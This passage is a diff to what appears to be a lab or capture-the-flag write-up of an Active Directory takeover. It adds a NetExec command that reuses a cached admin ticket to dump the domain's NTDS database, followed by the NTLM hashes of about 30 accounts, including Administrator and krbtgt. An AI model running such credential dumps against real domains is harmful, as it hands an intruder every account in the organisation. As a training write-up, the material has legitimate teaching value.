@@ -845,6 +845,48 @@ SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\A
 I can now authenticate as the domain admin
 
 ```python
+nxc smb dc.hsm-defense.local --use-kcache --ntds
+SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\Administrator from ccache (Pwn3d!)
+SMB         dc.hsm-defense.local 445    dc               [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc.hsm-defense.local 445    dc               Administrator:500:aad3b435b51404eeaad3b435b51404ee:639428eb318f47dae9703363da3fb30f:::
+SMB         dc.hsm-defense.local 445    dc               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         dc.hsm-defense.local 445    dc               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fe610f178a46bf13a974e6355139660b:::
+SMB         dc.hsm-defense.local 445    dc               kelly.johnson:1104:aad3b435b51404eeaad3b435b51404ee:b354944441b269a7b05e699cfdf35a6e:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\luke.harrison:1106:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\ethan.mercer:1107:aad3b435b51404eeaad3b435b51404ee:4a6691d528bb77ccfa40ad7fac7fbd33:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\aaron.pierce:1110:aad3b435b51404eeaad3b435b51404ee:dc6ab1e3791a8c51fd4ca43c61e1f3bd:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\nathan.reed:1111:aad3b435b51404eeaad3b435b51404ee:5bccbd82c10f11cb03a8ee4d70fcde8d:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\caleb.turner:1112:aad3b435b51404eeaad3b435b51404ee:dc6ab1e3791a8c51fd4ca43c61e1f3bd:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\adam.brooks:1113:aad3b435b51404eeaad3b435b51404ee:45016be689a00f63ad2497241e2a92b9:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\oscar.mazerath:1115:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\evan.carter:1117:aad3b435b51404eeaad3b435b51404ee:0bb16aa62777880fb1395dbba6d94fb3:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\dylan.foster:1118:aad3b435b51404eeaad3b435b51404ee:d1b056e1cac181b4e6c83af99853c1eb:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\ryan.cole:1119:aad3b435b51404eeaad3b435b51404ee:082e334ca28bc415193ac645c7f51d06:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\svc_delegate:1123:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\jason.caldwell:1124:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\james.carter:1127:aad3b435b51404eeaad3b435b51404ee:d02b461bfba68829596cda3249353b95:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\oliver.bennett:1128:aad3b435b51404eeaad3b435b51404ee:3365e0a474f335458b9b366a1e9ea631:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\ethan.hughes:1129:aad3b435b51404eeaad3b435b51404ee:af19eb87e43a1a6f6b9441cbcfbfcb32:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\lucas.turner:1130:aad3b435b51404eeaad3b435b51404ee:b1fa471bb3f7ba7bcc162628318a9f40:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\daniel.mitchell:1131:aad3b435b51404eeaad3b435b51404ee:fee8e4e9cbdb9003e76927f0c127b106:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\mason.bradley:1133:aad3b435b51404eeaad3b435b51404ee:ca5b86828098ec05f68108b59245d240:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\logan.shepherd:1134:aad3b435b51404eeaad3b435b51404ee:1faa46751de0f2f7dd97d6e4eb1d6b4c:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\noah.prescott:1135:aad3b435b51404eeaad3b435b51404ee:17c81df9473dd71726b8e127caedc35a:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\aiden.fletcher:1136:aad3b435b51404eeaad3b435b51404ee:4e06b0a9a94ac6d0fc7ea5429c1c2675:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\connor.bishop:1137:aad3b435b51404eeaad3b435b51404ee:2ae59cbd2b52ee50af8f4ec836c80f59:::
+SMB         dc.hsm-defense.local 445    dc               hsm-defense.local\zachary.holden:1138:aad3b435b51404eeaad3b435b51404ee:20d14ce01c18e5727341303cff0ad7f5:::
+SMB         dc.hsm-defense.local 445    dc               DC$:1000:aad3b435b51404eeaad3b435b51404ee:50e1526fdc7c9c8761d6f0dec916f4fd:::
+SMB         dc.hsm-defense.local 445    dc               HELPDESK01$:1105:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+SMB         dc.hsm-defense.local 445    dc               ITOPS01$:1122:aad3b435b51404eeaad3b435b51404ee:1043efc30b91803ce841d2911dfc0790:::
+SMB         dc.hsm-defense.local 445    dc               [+] Dumped 30 NTDS hashes to /home/kali/.nxc/logs/ntds/dc_dc.hsm-defense.local_2026-09-21_210847.ntds of which 27 were added to the database
+SMB         dc.hsm-defense.local 445    dc               [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         dc.hsm-defense.local 445    dc               [*] grep -iv disabled /home/kali/.nxc/logs/ntds/dc_dc.hsm-defense.local_2026-09-21_210847.ntds | cut -d ':' -f1
+```
+
+Domain compromise
+
+```python
 
 ```
 
